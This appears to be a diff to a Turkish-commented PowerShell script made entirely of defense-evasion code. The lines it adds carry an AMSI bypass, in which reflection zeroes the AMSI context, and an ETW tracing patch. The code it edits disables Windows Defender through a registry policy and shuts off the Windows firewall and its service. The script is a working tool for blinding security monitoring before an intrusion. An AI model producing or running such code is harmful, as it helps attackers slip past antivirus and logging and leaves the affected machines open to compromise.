@@ -1,3 +1,16 @@
+# AMSI Bypass
+$var = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.FullName -like '*Microsoft.PowerShell.Security*' }).GetType('Microsoft.PowerShell.AmsiContext', 'Static,NonPublic')
+$field = $var.GetField('amsiContext', 'NonPublic,Static')
+$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076)
+$field.SetValue($null, $mem)
+[System.Runtime.InteropServices.Marshal]::WriteInt32($mem, 0x00000000)
+
+# ETW Patch
+$eventTracer = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.FullName -like '*System.Management.Automation*' }).GetType('System.Management.Automation.Tracing.EventingTracer', 'Static,NonPublic')
+$field = $eventTracer.GetField('eventProviderId', 'Static,NonPublic')
+$field.SetValue($null, [Guid]::NewGuid())
+
+# Windows Defender Devre Dışı Bırak
 try {
     if (-not (Test-Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender")) {
         New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Force | Out-Null
@@ -7,15 +20,17 @@ try {
                      -Value 1 `
                      -PropertyType DWORD `
                      -Force | Out-Null
-    Write-Host "[+] Windows Defender başarıyla devre dışı bırakıldı (kalıcı)."
+    Write-Host "[+] Windows Defender devre dışı bırakıldı."
 } catch {
-    Write-Host "[-] Windows Defender devre dışı bırakılamadı: $_"
+    Write-Host "[-] Defender devre dışı bırakılamadı: $_"
 }
 
+# Güvenlik Duvarı Kapat
 try {
     Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
     Set-Service -Name 'mpssvc' -StartupType Disabled
     Stop-Service -Name 'mpssvc' -Force
+    Write-Host "[+] Güvenlik duvarı devre dışı bırakıldı."
 } catch {
-    Write-Host "Firewall disable attempt failed: $($_.Exception.Message)"
+    Write-Host "[-] Güvenlik duvarı kapatılamadı: $_"
 }
